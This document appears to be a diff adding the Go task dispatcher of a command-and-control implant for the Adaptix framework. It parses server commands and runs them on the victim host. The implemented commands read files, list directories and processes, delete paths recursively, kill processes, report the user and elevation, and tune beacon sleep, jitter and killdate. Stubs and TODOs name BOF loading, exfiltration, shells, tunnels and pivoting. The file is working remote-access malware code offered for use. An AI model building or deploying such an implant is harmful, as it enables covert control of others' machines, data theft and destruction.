@@ -1,0 +1,370 @@
+package main
+
+import (
+	"fmt"
+	"os"
+
+	"__NAME__/protocol"
+)
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// Task dispatcher for the adaptix_default binary protocol.
+//
+// The server sends tasks packed with PackArray (Little-Endian).
+// The implant parses them with ReaderLE and responds with WriterBE (Big-Endian),
+// which the server's Packer reads.
+//
+// Wire format (server → implant):
+//   [LE uint32: totalSize][task1_data][LE uint32: taskId1][task2_data][LE uint32: taskId2]...
+//
+// Wire format (implant → server):
+//   [BE uint32: totalBlobSize][BE uint32: taskId][BE uint32: cmdId][cmdData...]...
+// ═══════════════════════════════════════════════════════════════════════════════
+
+// TaskProcess parses the decrypted task blob and returns a response blob.
+func TaskProcess(data []byte) []byte {
+	r := protocol.NewReaderLE(data)
+
+	// First field: total size (LE uint32). Includes itself.
+	totalSize, err := r.ReadUint32()
+	if err != nil {
+		return nil
+	}
+	_ = totalSize
+
+	var inner []byte
+
+	// Parse task pairs: [command_data][LE uint32 taskId]
+	for r.Remaining() >= 4 {
+		cmdCode, err := r.ReadUint32()
+		if err != nil {
+			break
+		}
+
+		respData, taskIdParsed := dispatchCommand(r, cmdCode)
+
+		// The taskId follows each command's packed data.
+		// If the handler consumed all command fields, the next 4 bytes are the taskId.
+		// If taskId wasn't parsed inside the handler, read it here.
+		var taskId uint32
+		if taskIdParsed > 0 {
+			taskId = taskIdParsed
+		} else {
+			taskId, err = r.ReadUint32()
+			if err != nil {
+				break
+			}
+		}
+
+		if respData != nil {
+			w := protocol.NewWriterBE()
+			w.WriteUint32(taskId)
+			w.WriteUint32(cmdCode)
+			w.WriteRaw(respData)
+			inner = append(inner, w.Bytes()...)
+		}
+	}
+
+	if len(inner) == 0 {
+		return nil
+	}
+
+	// Wrap: [BE uint32 totalBlobSize (includes this field)] [inner]
+	out := protocol.NewWriterBE()
+	out.WriteUint32(uint32(len(inner) + 4))
+	out.WriteRaw(inner)
+	return out.Bytes()
+}
+
+// dispatchCommand handles a single command from the LE-packed task stream.
+// It reads the command-specific fields from r.
+// Returns (response_data, taskId). taskId is 0 if not consumed here.
+func dispatchCommand(r *protocol.ReaderLE, cmdCode uint32) ([]byte, uint32) {
+	switch cmdCode {
+
+	case protocol.COMMAND_TERMINATE:
+		// Format: [uint32 subcode] — 1=thread, 2=process
+		_, _ = r.ReadUint32() // subcode
+		os.Exit(0)
+		return nil, 0
+
+	case protocol.COMMAND_PWD:
+		// No additional fields — taskId follows immediately.
+		cwd, err := os.Getwd()
+		if err != nil {
+			return errorResponse(err.Error()), 0
+		}
+		w := protocol.NewWriterBE()
+		w.WriteString(cwd)
+		return w.Bytes(), 0
+
+	case protocol.COMMAND_CD:
+		// Format: [string path]
+		path, _ := r.ReadString()
+		normPath := agent.NormalizePath(path)
+		if err := os.Chdir(normPath); err != nil {
+			return errorResponse(err.Error()), 0
+		}
+		cwd, _ := os.Getwd()
+		w := protocol.NewWriterBE()
+		w.WriteString(cwd)
+		return w.Bytes(), 0
+
+	case protocol.COMMAND_CAT:
+		// Format: [string path]
+		path, _ := r.ReadString()
+		normPath := agent.NormalizePath(path)
+		content, err := os.ReadFile(normPath)
+		if err != nil {
+			return errorResponse(err.Error()), 0
+		}
+		w := protocol.NewWriterBE()
+		w.WriteString(path)
+		w.WriteBytes(content)
+		return w.Bytes(), 0
+
+	case protocol.COMMAND_LS:
+		// Format: [string dir]
+		dir, _ := r.ReadString()
+		normDir := agent.NormalizePath(dir)
+		absPath, entries, err := agent.GetListing(normDir)
+		if err != nil {
+			w := protocol.NewWriterBE()
+			w.WriteUint8(0) // result = error
+			w.WriteUint32(1)
+			return w.Bytes(), 0
+		}
+		w := protocol.NewWriterBE()
+		w.WriteUint8(1) // result = success
+		w.WriteString(absPath + "\\*")
+		w.WriteUint32(uint32(len(entries)))
+		for _, e := range entries {
+			isDir := uint8(0)
+			if e.IsDir {
+				isDir = 1
+			}
+			w.WriteUint8(isDir)
+			w.WriteUint64(uint64(e.Size))
+			w.WriteUint32(uint32(e.Date))
+			w.WriteString(e.Name)
+		}
+		return w.Bytes(), 0
+
+	case protocol.COMMAND_MKDIR:
+		// Format: [string path]
+		path, _ := r.ReadString()
+		normPath := agent.NormalizePath(path)
+		if err := os.MkdirAll(normPath, 0755); err != nil {
+			return errorResponse(err.Error()), 0
+		}
+		w := protocol.NewWriterBE()
+		w.WriteString(path)
+		return w.Bytes(), 0
+
+	case protocol.COMMAND_RM:
+		// Format: [string path]
+		path, _ := r.ReadString()
+		normPath := agent.NormalizePath(path)
+		if err := os.RemoveAll(normPath); err != nil {
+			return errorResponse(err.Error()), 0
+		}
+		return []byte{}, 0
+
+	case protocol.COMMAND_MV:
+		// Format: [string src][string dst]
+		src, _ := r.ReadString()
+		dst, _ := r.ReadString()
+		if err := os.Rename(agent.NormalizePath(src), agent.NormalizePath(dst)); err != nil {
+			return errorResponse(err.Error()), 0
+		}
+		return []byte{}, 0
+
+	case protocol.COMMAND_COPY:
+		// Format: [string src][string dst]
+		src, _ := r.ReadString()
+		dst, _ := r.ReadString()
+		info, err := os.Stat(agent.NormalizePath(src))
+		if err != nil {
+			return errorResponse(err.Error()), 0
+		}
+		if info.IsDir() {
+			err = agent.CopyDir(agent.NormalizePath(src), agent.NormalizePath(dst))
+		} else {
+			err = agent.CopyFile(agent.NormalizePath(src), agent.NormalizePath(dst))
+		}
+		if err != nil {
+			return errorResponse(err.Error()), 0
+		}
+		return []byte{}, 0
+
+	case protocol.COMMAND_PS_LIST:
+		// No additional fields.
+		procs, err := agent.ListProcesses()
+		if err != nil {
+			w := protocol.NewWriterBE()
+			w.WriteUint8(0)
+			w.WriteUint32(1)
+			return w.Bytes(), 0
+		}
+		w := protocol.NewWriterBE()
+		w.WriteUint8(1) // result = success
+		w.WriteUint32(uint32(len(procs)))
+		for _, p := range procs {
+			w.WriteUint16(p.Pid)
+			w.WriteUint16(p.PPid)
+			w.WriteUint16(p.SessionId)
+			arch := uint8(0)
+			if p.IsArch64 {
+				arch = 1
+			}
+			w.WriteUint8(arch)
+			elev := uint8(0)
+			if p.Elevated {
+				elev = 1
+			}
+			w.WriteUint8(elev)
+			w.WriteString(p.Domain)
+			w.WriteString(p.Username)
+			w.WriteString(p.Name)
+		}
+		return w.Bytes(), 0
+
+	case protocol.COMMAND_PS_KILL:
+		// Format: [uint32 pid]
+		pid, _ := r.ReadUint32()
+		proc, err := os.FindProcess(int(pid))
+		if err != nil {
+			return errorResponse(err.Error()), 0
+		}
+		if err := proc.Kill(); err != nil {
+			return errorResponse(err.Error()), 0
+		}
+		return []byte{}, 0
+
+	case protocol.COMMAND_GETUID:
+		// No additional fields.
+		username := os.Getenv("USER")
+		if username == "" {
+			username = os.Getenv("USERNAME")
+		}
+		domain := os.Getenv("USERDOMAIN")
+		elevated := agent.IsElevated()
+		high := uint8(0)
+		if elevated {
+			high = 1
+		}
+		w := protocol.NewWriterBE()
+		w.WriteUint8(high)
+		w.WriteString(domain)
+		w.WriteString(username)
+		return w.Bytes(), 0
+
+	case protocol.COMMAND_PROFILE:
+		// Format: [uint32 subcmd][subcmd-specific fields]
+		subcmd, _ := r.ReadUint32()
+		return handleProfile(r, subcmd), 0
+
+	case protocol.COMMAND_JOB_LIST:
+		// No additional fields. Return empty list.
+		w := protocol.NewWriterBE()
+		w.WriteUint32(0) // count = 0
+		return w.Bytes(), 0
+
+	case protocol.COMMAND_JOBS_KILL:
+		// Format: [uint32 jobId]
+		jobId, _ := r.ReadUint32()
+		// TODO: implement job kill logic
+		w := protocol.NewWriterBE()
+		w.WriteUint8(0)           // result = not found
+		w.WriteUint32(uint32(jobId))
+		return w.Bytes(), 0
+
+	case protocol.COMMAND_EXEC_BOF:
+		// Format: [bool async][string entryFunc][uint32 bofLen][raw bof][uint32 argsLen][raw args]
+		_, _ = r.ReadBool()    // async
+		_, _ = r.ReadString()  // entry function
+		bofLen, _ := r.ReadUint32()
+		_, _ = r.ReadRawBytes(int(bofLen))
+		argsLen, _ := r.ReadUint32()
+		_, _ = r.ReadRawBytes(int(argsLen))
+		// TODO: Integrate a COFF loader.
+		return errorResponse("BOF loader not yet implemented"), 0
+
+	case protocol.COMMAND_SAVEMEMORY:
+		// Format: [uint32 memoryId][uint32 totalSize][uint32 chunkSize][raw chunk]
+		_, _ = r.ReadUint32() // memoryId
+		_, _ = r.ReadUint32() // totalSize
+		chunkSize, _ := r.ReadUint32()
+		_, _ = r.ReadRawBytes(int(chunkSize))
+		// TODO: accumulate memory chunks for COMMAND_UPLOAD
+		return nil, 0
+
+	// TODO: Implement remaining commands:
+	//   COMMAND_DOWNLOAD, COMMAND_UPLOAD, COMMAND_EXFIL,
+	//   COMMAND_LINK, COMMAND_UNLINK, COMMAND_PIVOT_EXEC,
+	//   COMMAND_PS_RUN, COMMAND_REV2SELF, COMMAND_DISKS,
+	//   COMMAND_SHELL_*, COMMAND_TUNNEL_*
+
+	default:
+		return errorResponse(fmt.Sprintf("unknown command %d", cmdCode)), 0
+	}
+}
+
+func handleProfile(r *protocol.ReaderLE, subcmd uint32) []byte {
+	w := protocol.NewWriterBE()
+	w.WriteUint32(subcmd)
+
+	switch subcmd {
+	case 1: // sleep + jitter
+		sleep, _ := r.ReadUint32()
+		jitter, _ := r.ReadUint32()
+		stateMu.Lock()
+		agentSleep = int(sleep)
+		agentJitter = int(jitter)
+		stateMu.Unlock()
+		w.WriteUint32(sleep)
+		w.WriteUint32(jitter)
+
+	case 2: // download chunk size
+		size, _ := r.ReadUint32()
+		w.WriteUint32(size)
+
+	case 3: // killdate
+		kd, _ := r.ReadUint32()
+		stateMu.Lock()
+		killDate = int64(kd)
+		stateMu.Unlock()
+		w.WriteUint32(kd)
+
+	case 4: // workingtime
+		wt, _ := r.ReadUint32()
+		stateMu.Lock()
+		// TODO: decode working time int into workStart/workEnd
+		_ = wt
+		stateMu.Unlock()
+		w.WriteUint32(wt)
+
+	case 5: // burst set
+		enabled, _ := r.ReadUint32()
+		burstSleep, _ := r.ReadUint32()
+		burstJitter, _ := r.ReadUint32()
+		w.WriteUint32(enabled)
+		w.WriteUint32(burstSleep)
+		w.WriteUint32(burstJitter)
+
+	case 6: // burst show
+		// TODO: return actual burst config
+		w.WriteUint32(0) // enabled
+		w.WriteUint32(50) // sleep ms
+		w.WriteUint32(0)  // jitter
+	}
+	return w.Bytes()
+}
+
+// errorResponse returns a generic error that the server logs but doesn't crash on.
+func errorResponse(msg string) []byte {
+	w := protocol.NewWriterBE()
+	w.WriteUint32(1) // error code
+	w.WriteString(msg)
+	return w.Bytes()
+}
